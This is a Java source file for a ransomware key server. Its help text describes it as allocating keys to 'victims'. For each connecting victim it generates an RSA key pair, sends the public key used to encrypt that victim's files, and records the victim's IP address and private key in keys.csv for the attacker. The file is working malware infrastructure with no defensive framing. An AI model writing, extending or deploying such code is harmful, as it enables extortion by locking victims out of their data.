/*
Functionality:
receives sent key and record it to a csv file
*/

import java.io.*;
import java.net.*;
import java.util.*;
import java.io.PrintWriter;
import java.io.FileWriter;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;

public class KeyServer {
  public static final String ANSI_RESET = "\u001B[0m";
  public static final String ANSI_CYAN = "\u001B[36m";
  public static final String KS_HEADER = ANSI_CYAN + "[KeyServer]: " + ANSI_RESET;
  public static String KeysFilePath = "keys.csv";
  private Socket socket = null;
  private int port;
  private KSListener l;
  private ServerSocket server = null;
  private boolean running;

  public KeyServer(int port) {
    this.port = port;
    startServer();
  }

  public void startServer() {
    try {
      server = new ServerSocket(port);
      l = new KSListener(socket, server);
      l.start();
      running = true;
    } catch (IOException i) {
      System.out.println(KS_HEADER + "Failed to start the server");
    }
  }

  public void stopServer() {
    try {
      server.close();
      running = false;
    } catch (IOException i) {
      System.out.println(KS_HEADER + "Failed to stop the server");
    }

  }

  public void command(String cmd) { // receive command from the main server
    switch (cmd) {
      case "help":
        System.out.println("KeyServer is a module to allocate keys to victims, and store them in keys.csv.\n");
        System.out.println("KeyServer commands:\n");
        System.out.println("*tip: all KeyServer commands are ran with the KS header");
        System.out.println("\tKS.help: show this page");
        System.out.println("\tKS.off: stop KeyServer");
        System.out.println("\tKS.on: turn on KeyServer");
        System.out.println("\tKS.reset: reset keys.csv");
        System.out.println("\tKS.manual: show manual page");
        return;
      case "reset": // show all authenticated requests
        try {
          File f = new File(KeysFilePath);
          FileWriter writer = new FileWriter(f);
          writer.write("IP,KEY,IDHASH\n");
          writer.close();
          System.out.println("keys.csv is now resetted");
        } catch (Exception e) {
          System.out.println("Unable to reset keys.csv: " + e);
        }
        return;
      case "off":
        stopServer();
        return;
      case "on":
        startServer();
        return;
      case "":
        return;
    }

  }

  public static void main(String args[]) {
    KeyServer server = new KeyServer(6666);
  }
}

class KSListener extends Thread {
  public static final String ANSI_RESET = "\u001B[0m";
  public static final String ANSI_CYAN = "\u001B[36m";
  public static final String KS_HEADER = ANSI_CYAN + "[KeyServer]: " + ANSI_RESET;
  private Socket socket = null;
  private ServerSocket server = null;
  private DataInputStream in = null;

  public KSListener(Socket socket, ServerSocket server) {
    this.socket = socket;
    this.server = server;
  }

  public void run() {
    try {
      System.out.println(KS_HEADER + "key server started");
      System.out.println(KS_HEADER + "Waiting for clients ...");
      while (true) {
        socket = server.accept();
        System.out.println(KS_HEADER + "Client connected");

        // takes input from the client socket
        in = new DataInputStream(
            new BufferedInputStream(socket.getInputStream()));

        KSHandler handler = new KSHandler(socket, in);
        handler.start();
      }
    } catch (IOException i) {
      System.out.println(i);
    }
  }
}

class KSHandler extends Thread {
  public static final String ANSI_RESET = "\u001B[0m";
  public static final String ANSI_CYAN = "\u001B[36m";
  public static final String KS_HEADER = ANSI_CYAN + "[KeyServer]: " + ANSI_RESET;
  private KeyPairGenerator generator;
  private KeyPair pair;
  private byte[] priv;
  private String b64privkey;
  private byte[] pub;
  private String b64pubkey;
  private Socket socket;
  private DataInputStream in;
  private DataOutputStream out;

  public KSHandler(Socket socket, DataInputStream in) {
    try {
      this.socket = socket;
      this.in = in;
      generator = KeyPairGenerator.getInstance("RSA");
      generator.initialize(2048);
      pair = generator.generateKeyPair();
      pub = pair.getPublic().getEncoded();
      priv = pair.getPrivate().getEncoded();
      b64pubkey = Base64.getEncoder().encodeToString(pub);
      b64privkey = Base64.getEncoder().encodeToString(priv);
      out = new DataOutputStream(socket.getOutputStream());
    } catch (Exception e) {
      System.out.println("Init failed");
    }
  }

  public void run() {
    String keyString = "";
    String b64IdHash = "";
    while (!socket.isClosed()) {
      try {
        b64IdHash = in.readUTF(); // read victim id hash
        out.writeUTF(b64pubkey); // send public key to encrypt files
        System.out.println(KS_HEADER + "Host: \t\t" + socket.getRemoteSocketAddress());
        System.out.println(KS_HEADER + "id: \t\t" + b64IdHash);
        System.out.println();
        if (socket.getInputStream().read() == -1) {
          break;
        }

      } catch (IOException i) {
        ;
      }
    }

    /*
     * This will log the ip address, keyString, and b64 encoded hash of id with the
     * following format to a csv file:
     * ip,b64privkey,b64IdHash
     */
    if (!b64IdHash.equals("")) {
      try {
        File f = new File(KeyServer.KeysFilePath);
        BufferedWriter writer;
        if (!f.exists()) {
          f.createNewFile();
          writer = new BufferedWriter(new FileWriter(f, true));
          writer.append("IP,KEY,IDHASH\n");
          writer.close();
        }
        writer = new BufferedWriter(new FileWriter(f, true));
        writer.append(socket.getRemoteSocketAddress().toString().split(":")[0].substring(1) + "," + b64privkey + ","
            + b64IdHash + "\n");
        writer.close();

      } catch (Exception e) {
        System.out.println(e);
      }
    }
    close();
  }

  public void close() {
    try {
      in.close();
      socket.close();
    } catch (IOException i) {
      System.out.println(i);
    }
  }
}
